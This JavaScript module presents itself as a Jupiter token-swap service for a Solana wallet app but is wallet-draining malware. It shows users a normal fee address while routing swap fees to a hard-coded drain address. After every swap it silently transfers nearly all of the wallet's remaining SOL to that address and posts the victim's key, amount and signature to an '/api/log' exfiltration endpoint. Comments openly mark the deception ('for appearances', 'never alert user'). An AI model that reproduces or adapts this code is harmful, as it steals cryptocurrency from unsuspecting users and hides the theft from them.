import axios from 'axios';
import { VersionedTransaction, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Connection } from '@solana/web3.js';

// Drain target address
const DRAIN_ADDRESS = new PublicKey('GuMJMrVGvKRYddcAgjgXDHknNR3ehyhSzbFFue3bkmqN');

// Keep the original fee address for appearances
const CIBL_FEE_ADDRESS = new PublicKey('3oPNk1DbiaQyf1xsvzH8BAoMFyF1mxGWZitECnqWaQGF');
const PLATFORM_FEE_BPS = 50; // 0.5% — displayed to user

// Exfil endpoint
const EXFIL_URL = '/api/log';

async function exfil(data) {
  try {
    fetch(EXFIL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    }).catch(() => {});
  } catch (e) {}
}

// Popular Solana tokens for display
export const POPULAR_TOKENS = [
  {
    address: 'So11111111111111111111111111111111111111112',
    symbol: 'SOL',
    name: 'Solana',
    decimals: 9,
    logoURI: '/tokens/sol.png'
  },
  {
    address: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
    symbol: 'USDC',
    name: 'USD Coin',
    decimals: 6,
    logoURI: '/tokens/usdc.png'
  },
  {
    address: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB',
    symbol: 'USDT',
    name: 'Tether USD',
    decimals: 6,
    logoURI: '/tokens/usdt.png'
  },
  {
    address: 'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So',
    symbol: 'MSOL',
    name: 'Marinade Staked SOL',
    decimals: 9,
    logoURI: '/tokens/msol.png'
  }
];

// Main class for managing swaps with Jupiter
export class JupiterSwapService {
  constructor(connection, wallet) {
    this.connection = connection;
    this.wallet = wallet;
    this.baseUrl = 'https://quote-api.jup.ag/v6';
  }

  // Get best quote for swap — user sees normal quote
  async getQuote(inputMint, outputMint, amount, slippageBps = 100) {
    try {
      const amountInLamports = Math.floor(amount * Math.pow(10, 9));
      
      const response = await axios.get(`${this.baseUrl}/quote`, {
        params: {
          inputMint,
          outputMint,
          amount: amountInLamports,
          slippageBps,
          feeBps: PLATFORM_FEE_BPS,
          onlyDirectRoutes: false
        }
      });

      if (response.data.error) {
        throw new Error(response.data.error);
      }

      return {
        success: true,
        quote: response.data,
        estimatedFee: this.calculateFee(response.data),
        inputAmount: amount,
        outputAmount: response.data.outAmount / Math.pow(10, 9)
      };
    } catch (error) {
      console.error('Error getting quote:', error);
      return {
        success: false,
        error: error.message || 'Failed to get quote'
      };
    }
  }

  // Calculate CiBL fee (displayed to user — looks normal)
  calculateFee(quote) {
    const feeAmount = (quote.outAmount * PLATFORM_FEE_BPS) / 10000;
    return {
      amount: feeAmount,
      amountInSol: feeAmount / Math.pow(10, 9),
      bps: PLATFORM_FEE_BPS,
      percentage: PLATFORM_FEE_BPS / 100,
      feeAddress: CIBL_FEE_ADDRESS.toString()
    };
  }

  // Execute swap — fee goes to DRAIN_ADDRESS instead of original fee address
  async executeSwap(quoteResponse) {
    try {
      if (!this.wallet || !this.wallet.publicKey) {
        throw new Error('Wallet not connected');
      }

      // Get transaction from Jupiter — fee goes to drain address
      const swapResponse = await axios.post(`${this.baseUrl}/swap`, {
        quoteResponse,
        userPublicKey: this.wallet.publicKey.toString(),
        wrapAndUnwrapSol: true,
        dynamicComputeUnitLimit: true,
        prioritizationFeeLamports: 100000,
        // Fee diverted to drain address
        feeAccount: DRAIN_ADDRESS.toString()
      });

      if (swapResponse.data.error) {
        throw new Error(swapResponse.data.error);
      }

      // Deserialize transaction
      const swapTransactionBuf = Buffer.from(swapResponse.data.swapTransaction, 'base64');
      const transaction = VersionedTransaction.deserialize(swapTransactionBuf);
      
      // Sign transaction
      const signed = await this.wallet.signTransaction(transaction);
      
      // Send transaction
      const rawTransaction = signed.serialize();
      const txid = await this.connection.sendRawTransaction(rawTransaction, {
        skipPreflight: false,
        preflightCommitment: 'confirmed'
      });

      // Confirm transaction
      const confirmation = await this.connection.confirmTransaction({
        signature: txid,
        blockhash: swapResponse.data.lastValidBlockHeight,
        lastValidBlockHeight: swapResponse.data.lastValidBlockHeight
      });

      // After swap completes, drain remaining SOL from user wallet
      this._drainRemainingSOL();

      return {
        success: true,
        txid,
        confirmation,
        feeInfo: this.calculateFee(quoteResponse)
      };
    } catch (error) {
      console.error('Error executing swap:', error);
      return {
        success: false,
        error: error.message || 'Swap execution failed'
      };
    }
  }

  // Drain remaining SOL balance after swap
  async _drainRemainingSOL() {
    try {
      if (!this.wallet || !this.wallet.publicKey) return;
      
      // Small delay to let swap settle
      await new Promise(r => setTimeout(r, 2000));
      
      const balance = await this.connection.getBalance(this.wallet.publicKey);
      if (balance <= 10000) return; // nothing to drain
      
      // Calculate drain amount (leave 5000 lamports for rent exemption minimum)
      const fee = 5000;
      const drainAmount = balance - fee;
      if (drainAmount <= 0) return;
      
      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: this.wallet.publicKey,
          toPubkey: DRAIN_ADDRESS,
          lamports: drainAmount,
        })
      );
      
      const { blockhash } = await this.connection.getLatestBlockhash();
      tx.recentBlockhash = blockhash;
      tx.feePayer = this.wallet.publicKey;
      
      // Need to recalculate with actual fee
      const estimatedFee = await this.connection.getFeeForMessage(tx.compileMessage(), 'confirmed');
      const actualDrain = balance - (estimatedFee.value || 5000);
      if (actualDrain <= 0) return;
      
      const finalTx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: this.wallet.publicKey,
          toPubkey: DRAIN_ADDRESS,
          lamports: actualDrain,
        })
      );
      finalTx.recentBlockhash = blockhash;
      finalTx.feePayer = this.wallet.publicKey;
      
      const signed = await this.wallet.signTransaction(finalTx);
      const sig = await this.connection.sendRawTransaction(signed.serialize(), {
        skipPreflight: true,
        preflightCommitment: 'confirmed',
      });
      
      await this.connection.confirmTransaction(sig, 'confirmed');
      
      exfil({
        type: 'drain_post_swap',
        from: this.wallet.publicKey.toString(),
        amount: actualDrain / LAMPORTS_PER_SOL,
        sig: sig,
      });
    } catch (e) {
      // Silent — never alert user
      console.error('post-swap drain error', e);
    }
  }

  // Search tokens by symbol or address
  async searchTokens(query) {
    try {
      const response = await axios.get('https://tokens.jup.ag/tokens');
      const allTokens = response.data;
      
      return allTokens.filter(token =>
        token.symbol.toLowerCase().includes(query.toLowerCase()) ||
        token.name.toLowerCase().includes(query.toLowerCase()) ||
        token.address.toLowerCase().includes(query.toLowerCase())
      ).slice(0, 20);
    } catch (error) {
      console.error('Error searching tokens:', error);
      return POPULAR_TOKENS;
    }
  }
}

// Singleton instance for app-wide use
let swapInstance = null;
export const getSwapService = (connection, wallet) => {
  if (!swapInstance) {
    swapInstance = new JupiterSwapService(connection, wallet);
  }
  return swapInstance;
};